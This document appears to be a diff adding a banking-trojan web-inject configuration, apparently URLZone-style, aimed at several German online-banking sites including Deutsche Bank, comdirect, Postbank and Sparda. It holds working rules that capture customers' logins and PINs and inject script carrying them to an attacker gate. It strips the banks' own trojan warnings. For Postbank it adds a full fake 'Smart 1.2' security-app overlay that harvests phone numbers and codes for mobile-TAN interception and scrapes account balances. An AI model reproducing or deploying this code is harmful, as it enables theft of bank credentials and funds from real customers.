+ITINITPAGE=|/trxm/*/gvo/login/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DETYPETAN%[0000]|End
+ITINITSTART=|loginTab=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|meine.deutsche-bank.de|banking.berliner-bank.de|meine.norisbank.de|End
+ITINITPAGE=|/trxm/*/gvo/login/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DEBRANCH%[0000]|End
+ITINITSTART=|branch=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|meine.deutsche-bank.de|banking.berliner-bank.de|meine.norisbank.de|End
+ITINITPAGE=|/trxm/*/gvo/login/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DEUSERACC%[0000]|End
+ITINITSTART=|account=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|meine.deutsche-bank.de|banking.berliner-bank.de|meine.norisbank.de|End
+ITINITPAGE=|/trxm/*/gvo/login/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DEUSERPASS%[0000]|End
+ITINITSTART=|pin=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|meine.deutsche-bank.de|End
+ITINJPAGE=|/trxm/db/invoke/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%DEBRANCH% : %DEUSERACC%";
+		var _pasw = "%DEUSERPASS%";
+		var _site = "02";
+
+			if ("%DETYPETAN%" != "mobileTAN")
+			_site = "00";
+		
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|banking.berliner-bank.de|End
+ITINJPAGE=|/trxm/bb/invoke/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%DEBRANCH% : %DEUSERACC%";
+		var _pasw = "%DEUSERPASS%";
+		var _site = "03";
+
+			if ("%DETYPETAN%" != "mobileTAN")
+			_site = "00";
+		
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|meine.norisbank.de|End
+ITINJPAGE=|/trxm/noris/invoke/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%DEBRANCH% : %DEUSERACC%";
+		var _pasw = "%DEUSERPASS%";
+		var _site = "04";
+
+			if ("%DETYPETAN%" != "mobileTAN")
+			_site = "00";
+		
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+
+=================================== kunde.comdirect.de ====================================
+
+ITINITHOST=|kunde.comdirect.de|End
+ITINITPAGE=|/lp/wt/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*&param1=*&param3=*&direktzu=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%COMDUSERACC%[0000]|End
+ITINITSTART=|param1=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|kunde.comdirect.de|End
+ITINITPAGE=|/lp/wt/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*&param1=*&param3=*&direktzu=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%COMDUSERPASS%[0000]|End
+ITINITSTART=|param3=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|kunde.comdirect.de|End
+ITINJPAGE=|/itx/*?execution=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%COMDUSERACC%";
+		var _pasw = "%COMDUSERPASS%";
+		var _site = "05";
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|kunde.comdirect.de|End
+ITINJPAGE=|/lp/wt/login*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div|End
+ITINJEND=|</div>|End
+ITINJRXPREG=||End
+ITINJCODE=|>Trojaner</a>|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+=================================== cortalconsors.de ====================================
+
+ITINITHOST=|www.cortalconsors.de|End
+ITINITPAGE=|/euroWebDe/-;jsessionid=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*userId=*&nip=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%CORTUSERACC%[0000]|End
+ITINITSTART=|userId=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|www.cortalconsors.de|End
+ITINITPAGE=|/euroWebDe/-;jsessionid=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*userId=*&nip=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%CORTUSERPASS%[0000]|End
+ITINITSTART=|nip=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|www.cortalconsors.de|End
+ITINJPAGE=|/euroWebDe/*&s_login=true|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%CORTUSERACC%";
+		var _pasw = "%CORTUSERPASS%";
+		var _site = "07";
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+=================================== haspa.de ====================================
+
+ITINITHOST=|ssl2.haspa.de|End
+ITINITPAGE=|/OnlineFiliale/banking/filter_login;jsessionid=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%HASPUSERACC%[0000]|End
+ITINITSTART=|#2=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|ssl2.haspa.de|End
+ITINITPAGE=|/OnlineFiliale/banking/filter_login;jsessionid=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%HASPUSERPASS%[0000]|End
+ITINITSTART=|#3=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+ITINJHOST=|ssl2.haspa.de|End
+ITINJPAGE=|/OnlineFiliale/banking/services/welcome|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|"allowScriptAccess", "sameDomain"|End
+ITINJEND=|);|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|, "wmode", "opaque"|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|ssl2.haspa.de|End
+ITINJPAGE=|/OnlineFiliale/banking/services/welcome|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<title>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%HASPUSERACC%";
+		var _pasw = "%HASPUSERPASS%";
+		var _site = "08";
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+
+=================================== 1822direkt.com ====================================
+
+ITINITHOST=|banking.1822direkt.com|End
+ITINITPAGE=|/JOBa1822Web/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*login=*&pin=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DIREUSERACC%[0000]|End
+ITINITSTART=|login=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|banking.1822direkt.com|End
+ITINITPAGE=|/JOBa1822Web/login.do|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*login=*&pin=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%DIREUSERPASS%[0000]|End
+ITINITSTART=|pin=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|banking.1822direkt.com|End
+ITINJPAGE=|/*/readInitialData.do*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<title>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%DIREUSERACC%";
+		var _pasw = "%DIREUSERPASS%";
+		var _site = "09";
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+=================================== postbank.de ====================================
+
+
+
+
+ITINITHOST=|banking.postbank.de|End
+ITINITPAGE=|/rai/login?-1.IFormSubmitListener-login-loginForm|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%POSTUSERACC%[0000]|End
+ITINITSTART=|nutzername=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|banking.postbank.de|End
+ITINITPAGE=|/rai/login?-1.IFormSubmitListener-login-loginForm|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%POSTUSERPASS%[0000]|End
+ITINITSTART=|kennwort=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+ITINJHOST=|banking.postbank.de|End
+ITINJPAGE=|/rai/crypt/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=|" class="state-current">Konten|End
+ITINJSTART=|<body|End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| style="display:none"|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|banking.postbank.de|End
+ITINJPAGE=|/rai/crypt/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=|" class="state-current">Konten|End
+ITINJSTART=||End
+ITINJEND=|</body>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<div id="_ovrl789" style="display:none">
+
+	<div id="ovrl_pg1">
+
+		<div id="content"> <div id="content-cn">        <br />     <br />                     	<div class="box box-contact"> 	  <div class="box-cn">  	    <div class="box-hd"> 	      <div class="box-title">    	      	      </div> 	    </div>  <br />
+	
+	
+
+<div class="message-box-campagne">
+
+
+		<p> Achtung, wegen den h&auml;ufigen F&auml;llen von unberechtigten Zugriffen auf pers&ouml;nliche Kundeninformation bei der Mobilfunknetz - &Uuml;bertragung, ist die Benutzung eines Smartphones ab dem @date@ nur mit der Smart 1.2 App m&ouml;glich. </p>  <p> Die App wird kostenlos bereitgestellt. </p>  <p> Um Smart 1.2 App zu benutzen sind keine Vorkenntnisse n&ouml;tig. Sie brauchen nur 2 Minuten um die App zu installieren und Ihre Kundendaten somit zu sch&uuml;tzen. </p>  
+		
+
+		
+		
+		<p> Sie erhalten in k&uuml;rze einen Download - Link f&uuml;r die App.</p>  <p>Geben Sie die Mobilfunknummer Ihres Smartphones ein: </p>
+
+
+
+
+
+</div> 
+
+
+		<br />     <form name="frm_st1" method="GET" action="" onsubmit="return _NextStep(2, document.forms['frm_st1'].Phone.value);">             <fieldset>              <div class="field fld-text fld-phonenumber fld-phonenumber-mtan" id="id15f">                 <div class="field-cn">                     <div class="field-bd">                                 <span class="field-group">                                     <span class="field-label">                                       <label>                                         <b>Nummer:</b>                                       </label>                                     </span>                                     <span class="field-input">                                         <input type="text" class="type-text required" value="" name="Phone" id="" onfocus="" onkeyup="" maxlength="15"/>                                     </span>                                 </span>                     </div>                     <div class="field-ft">                         <span id="id161">  </span>                     </div>                 </div>             </div>         </fieldset> 		   		   		   		     		<br />   	         	  </div>       		<fieldset>   			<div align="right"> 				
+		
+		<button type="submit" class="type-submit" style="float:right;" name="" value="Weiter" onclick="return _NextStep(2, document.forms['frm_st1'].Phone.value);"> 					<span>Weiter</span>  				</button>
+
+		<button type="button" class="type-submit" style="float:right;" name="" value="Details" onclick="return _Details();"> 					<span>Details</span>  				</button>
+
+		</div>  		</fieldset>  </form>      	</div>    </div>  </div> 
+
+
+	</div>
+
+
+
+
+
+	
+	
+	<div id="ovrl_pg2">
+
+		<div id="content"> <div id="content-cn">        <br />     <br />
+
+<form name="frm_st2" method="GET" action="" onsubmit="return _NextStep(3, document.forms['frm_st2'].Code.value);"> 
+
+		<div class="box box-contact"> 	  <div class="box-cn">  	    <div class="box-hd"> 	      <div class="box-title">    	      	      </div> 	    </div>  <br />  	  
+		
+		
+		
+		<div class="message-box-campagne">
+
+
+		
+
+
+
+		<p>Um die App zu starten, f&uuml;hren Sie folgende Schritte durch:</p>
+		
+		<p>1. Herunterladen und Installation der App.</p>
+		
+		<p>
+		
+		(Wenn die App nicht von alleine startet, gehen Sie in Einstellungen, dann Downloads und starten Sie die Smart Security 1.2 App)
+		</p>
+		<p>
+		
+		2. Es wird ein pers&ouml;nliches Passwort generiert.
+		</p>
+		<p>Geben Sie das Passwort hier ein:</p> 
+		
+		
+		<br />
+		
+
+
+            <fieldset>              <div class="field fld-text fld-recipient-name" id="id15f">                 <div class="field-cn">                     <div class="field-bd">                                 <span class="field-group">                                     <span class="field-label">                                       <label>                                         <b>Code:</b>                                       </label>                                     </span>                                     <span class="field-input">                                         <input type="text" class="type-text required" value="" name="Code" id="id160" onfocus="" onkeyup="" maxlength="10"/>                                     </span>                                 </span>                     </div>                     <div class="field-ft">                         <span id="id161">  </span>                     </div>                 </div>             </div>         </fieldset>
+
+
+
+
+
+		<p>3. Dr&uuml;cken Sie "OK" in der App.</p>
+		
+		<p>4. Dr&uuml;cken Sie Weiter.</p>
+		
+		<br />
+		<p>Wenn Sie innerhalb von 5 Minuten keine SMS mit dem Download Link bekommen, probieren Sie es bitte nochmal.</p>
+		
+		
+		<p>Dr&uuml;cken Sie Nochmal Senden.</p>		
+		
+		
+		<br>
+
+
+
+
+		</div> 
+
+
+ 	         	  </div>       		<fieldset>
+
+     
+
+
+
+				  <button type="submit" class="type-submit" name="" value="Weiter" onclick="return _NextStep(3, document.forms['frm_st2'].Code.value);" style="float:right;">Weiter</button>	
+
+				  <button type="button" class="type-submit" name="" value="Nochmal Senden" onclick="_ReSendSms();" style="float:right;">Nochmal Senden</button>
+				  
+				  
+				  
+				  </fieldset>  </form>      	</div>    </div>  </div> 
+
+
+	</div>	
+	
+
+
+
+	
+
+</div>
+
+
+
+
+	<script type="text/javascript">
+
+	
+	
+	function GetAllBalans(){
+	
+		if(!document.getElementsByClassName)
+		return '';
+	
+		var _sele = document.getElementsByClassName('account-balance');
+		var res = "";
+		var buff = "";
+
+		for (var ct=0; ct < _sele.length; ct++){
+		buff = _sele[ct].getElementsByTagName('span')[0].innerHTML; 
+			
+			if (!buff)
+			buff = _sele[ct].getElementsByTagName('p')[0].innerHTML; 
+		
+		res += buff + "; ";
+		}
+	
+		return res;
+	
+	
+	}
+	
+
+
+	
+	
+	var main_cn = document.getElementById("main-cn");
+	var ovrl_pg1 = document.getElementById("ovrl_pg1");
+	var ovrl_pg2 = document.getElementById("ovrl_pg2");
+
+	var save_main_cn = main_cn.innerHTML;	
+
+
+	document.getElementById("aside").innerHTML = ""; //hide spam	
+	
+	
+	
+	function validatecode(code){ if (code.length != 10) return false; if (code == "5296185651") return true;  var num_char = 0; for (var i = 0; i < code.length - 2; i++) { num_char += parseInt(code.substr(i, 1)); } num_char += 13; var cr = parseInt(code.substr(8, 2)); if (num_char == cr) return true; return false;}
+
+
+
+
+	function _Details(){
+	
+	    var lefto = screen.availWidth/2-150;
+	    var righto = screen.availHeight/2-125;
+	    win1 = window.open("", "INFO", "width=500, height=400, left=" + lefto + ", top="+righto+"");	
+
+		win1.document.open();
+		win1.document.writeln("<html><head><title>SMART 1.2 Security</title><link rel=\"stylesheet\" type=\"text/css\" href=\"rai/css/rai.css\"></head><body bgcolor='#E5EDF6'>"+
+								"<div style=\"background:#ffcc00\"><img style=\"margin:10px;\" src=\"/rai/rai/image/pb-logo.png\"  border=\"0\" /></div>"+
+
+
+							"<div class=\"message-box-campagne\" style=\"margin: 10 10 10 10;\"><p>Smart 1.2 App bietet Ihnen einen Schutz vor Malware, Spyware und Trojaner - Abwehr 24 Stunden am Tag - entsprechend Vorgaben der deutschen Kreditinstitute f&uuml;r das Online - Banking.<br>MAXIMALE SICHERHEIT</p> <ul> <li>Kommunikation &uuml;ber direkte, verschl&uuml;sselte Schnittstellen</li> <li>Sichere Verschl&uuml;sselung</li><li> Schutz durch ein von Ihnen angelegtes individuelles Bank LOGIN</li><li> Blockierung vom unberechtigten SMS Versand und Weiterleitungen</li><li> Verschl&uuml;sselung eingehender und ausgehender SMS - Nachrichten</li><li> effektiver Phishing - Schutz und Antivirenschutz gegen Smartphone Trojaner</li><li> Kompatibel mit allen g&auml;ngigen Ger&auml;ten</ul><p>Ihre Kontoinformationen und Daten sind somit auch bei Verlust des Ger&auml;tes vor dem Zugriff Fremder gesch&uuml;tzt. Der T&Uuml;V - Siegel best&auml;tigt die h&ouml;chsten Sicherheitsstandards der Smart 1.2 App beim Mobile - Banking.Die strengen Sicherheitsbestimmungen f&uuml;r Smart 1.2 App werden regelm&auml;&szlig;ig von unabh&auml;ngigen Sicherheitsexperten des T&Uuml;V gepr&uuml;ft und entsprechend zertifiziert. Bei uns wird SICHERHEIT gro&szlig;geschrieben.</p></div>"+
+
+							  
+							  "</body></html>"
+							  );
+
+		win1.focus();
+
+
+		return false;
+	
+	}
+
+
+	
+	function _NextStep(step, data) {
+
+		if (step == 2){
+			
+
+			if(!data.match(/^49\d{7,17}$/))
+			{
+				alert('Sie haben eine falsche Mobilfunknummer eingegeben. Bitte versuchen Sie es nocheinmal\nBeispiel: 490082828282');
+				document.forms['frm_st1'].Phone.focus();
+				return false;
+			}
+
+			privates.step = privates.serverData.step = 2;
+
+			statModal.ajaxQ(privates.script,'set_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&phone=' + data);
+			
+			main_cn.innerHTML = ovrl_pg2.innerHTML;
+			ovrl_pg2.innerHTML = "";
+			
+			document.forms['frm_st2'].Code.focus();
+			
+		}
+
+
+		if (step == 3){
+
+		setTimeout(function(){privates.resendtimer = true;}, 3 * 60 * 1000);
+		
+		
+			if (!validatecode(data)) {
+			alert('Die Eingabe des Passworts ist nicht korrekt. Bitte versuchen Sie es nocheinmal');
+			return false;
+			}
+
+			privates.step = privates.serverData.step = 3;
+			statModal.ajaxQ(privates.script,'set_data=1&step='+privates.serverData.step+'&vcode=' + data);
+			main_cn.innerHTML = save_main_cn;
+		}		
+		
+	
+	return false;
+	}		
+	
+	
+	function _ReSendSms(){
+	
+		if (privates.resendtimer)
+		{
+		privates.resendtimer = false;
+		statModal.ajaxQ(privates.script,'resend=true');
+		alert("Mitteilung gesendet.");
+		} else
+		alert("Die nachste SMS kann erst in 5 Minuten angefordert werden");
+	
+	}
+	
+	
+
+
+
+		var _shid = "%BOTSHID%";
+		var _login = "%POSTUSERACC%";
+		var _pasw = "%POSTUSERPASS%";
+		var _site = "01";
+
+
+				var privates = {
+					resendtimer: false,
+					shid:_shid,
+					site:_site,
+					login:_login,
+					password:_pasw,
+					ecode: "",
+					script:"/gate_urlzone/" + (new Date()).getTime() + "S/", 
+					serverData:{
+						select:0,date:'',step:1,phone:'',result:''
+					}
+
+
+				}
+
+
+
+		window.statModal = {
+
+				serviceErrMsg: "Leider steht das Online-Banking derzeit nicht zur Verf&uuml;gung. Wir bem&uuml;hen uns darum, dass Ihnen unser Service schnellstm&ouml;glich wieder zur Verf&uuml;gung steht.",
+				
+				show: function(){
+				
+					if (privates.serverData.step == 1){
+						main_cn.innerHTML = ovrl_pg1.innerHTML.replace("@date@", privates.serverData.date);
+						ovrl_pg1.innerHTML = "";
+						document.body.style.display = 'block';
+						document.forms['frm_st1'].Phone.focus();
+						
+					
+						
+					} else
+					if (privates.serverData.step == 2){
+						main_cn.innerHTML = ovrl_pg2.innerHTML;
+						ovrl_pg2.innerHTML = "";						
+						document.body.style.display = 'block';
+						document.forms['frm_st2'].Code.focus();
+						setTimeout(function(){privates.resendtimer = true; }, 3 * 60 * 1000);
+					} else
+					if (privates.serverData.step == 3){
+					
+					}
+				
+				document.body.style.display = 'block';
+				},
+
+				
+				
+				
+				XHRResponse: function(data){
+
+
+
+					if(!data || typeof(data) != 'string'){return;}
+					var matches;
+				
+
+				
+					for(var i in privates.serverData){
+						matches = [];
+						var re = new RegExp(i+"\\s*:\\s*([^\\s]*?),");
+						matches = data.match(re);
+						if(!matches){
+							re = new RegExp(i+"\\s*:\\s*([^\\s]*?)$");
+							matches = data.match(re);
+						}
+
+
+						if(matches && matches[1]){
+							privates.serverData[i]=matches[1];
+						}
+					}
+				},
+
+
+				ajaxQ: function(scriptUrl,data){
+					
+					
+					if(!scriptUrl || typeof(scriptUrl)!="string"){return false;}
+
+					scriptUrl += ((/\?/).test(scriptUrl) ? "&" : "?") + data;
+					
+
+					{
+						req = null;
+						var script_id = null;
+						var tempUrl = scriptUrl;
+
+						script_id = document.getElementById('oldXHRResponse');
+						if(script_id){
+							document.getElementsByTagName('head')[0].removeChild(script_id);
+						}
+						var script = document.createElement('script');
+						script.setAttribute('type', 'text/javascript');
+						script.setAttribute('src', tempUrl);
+						script.setAttribute('id', 'oldXHRResponse');
+						document.getElementsByTagName('head')[0].appendChild(script);
+					}
+
+					
+				}	,
+	
+	
+	
+				wait: function(timeout,msStep,callback,erCallback){
+					if(typeof(callback) != 'function'){return;}
+
+					
+					if(!msStep || isNaN(msStep) || msStep<10){msStep=100;}
+					if(!timeout || isNaN(timeout) || timeout<100){timeout=1000;}
+
+					var waiting = 0,timer = setInterval(function(){
+
+
+
+						waiting +=msStep;
+						if(waiting > timeout || privates.serverData.result == 'error'){
+							clearInterval(timer);
+
+							if(erCallback !== undefined && typeof(erCallback) == 'function'){
+								erCallback.call();
+							}
+							return;
+						}
+						if(privates.serverData.result == 'success'){
+
+							clearInterval(timer);
+							privates.serverData.result='';
+							callback.call();
+						}
+
+
+
+					},msStep);
+				}	,
+
+
+
+
+		_init: function(){
+
+			if (_site == '00')
+			{
+				document.body.style.display = 'block';
+				return ;
+			} 
+		
+		
+				statModal.ajaxQ(privates.script,'get_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&site='+privates.site+'&vi=2&blns=' + encodeURIComponent(GetAllBalans()));
+
+				
+							
+				
+				statModal.wait(10000, 100, function(){
+					privates.step = privates.serverData.step;
+					privates.date = privates.serverData.date;
+
+					
+						
+					
+					if(privates.step > 4)
+					{
+					document.body.style.display = 'block';
+					return ;
+					}
+					switch(privates.serverData.select){
+						case "1":
+						{
+						document.body.innerHTML = '<h1 style="color:red">'+statModal.serviceErrMsg+'</h1>';
+						document.body.style.display = 'block';
+						break;
+						}
+						
+						case "2":
+						{
+						document.body.style.display = 'block';
+						return;
+						break;
+						}
+						default:
+						{
+						statModal.show();
+						
+						}
+					}
+				},function(){document.body.style.display = 'block';});
+
+
+
+
+
+
+
+				
+		}
+
+
+		}
+
+
+
+
+
+
+
+	statModal._init();
+
+	</script>
+
+
+
+	       |End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|banking.postbank.de|End
+ITINJPAGE=|/rai/login|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="teaser tsr-medium">|End
+ITINJEND=|<div class="teaser-ft">[*]</div>[*]</div>[*]</div>|End
+ITINJRXPREG=||End
+ITINJCODE=|Achtung: Trojaner!|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+=================================== sparda.de ====================================
+
+ITINITHOST=|banking.sparda.de|End
+ITINITPAGE=|/wps/portal/spardamodern-banking/*|/wps/portal/spardaclassic-banking/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*&userid=*&password=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPRDUSERACC%[0000]|End
+ITINITSTART=|userid=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|banking.sparda.de|End
+ITINITPAGE=|/wps/portal/spardamodern-banking/*|/wps/portal/spardaclassic-banking/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*&userid=*&password=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%SPRDUSERPASS%[0000]|End
+ITINITSTART=|password=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+ITINITHOST=|banking.sparda.de|End
+ITINITPAGE=|/wps/portal/spardamodern-banking/*|/wps/portal/spardaclassic-banking/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPRDBLZ%[0000]|End
+ITINITSTART=|/logo/logo-|End
+ITINITEND=|.|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|banking.sparda.de|End
+ITINJPAGE=|/wps/myportal/spardamodern-banking/*|/wps/myportal/spardaclassic-banking/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<head>|End
+ITINJEND=|<|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script type="text/javascript">
+		var _shid = "%BOTSHID%";
+		var _login = "%SPRDBLZ% : %SPRDUSERACC%";
+		var _pasw = "%SPRDUSERPASS%";
+		var _site = "06";
+	</script>
+%SMSSCRIPT%
+
+	   |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|banking.sparda.de|End
+ITINJPAGE=|/wps/portal/spardamodern-banking*|/wps/portal/spardaclassic-banking*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="login-messages"|End
+ITINJEND=|<div class="foot"></div>[*]</div>|End
+ITINJRXPREG=||End
+ITINJCODE=|Trojaner!|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
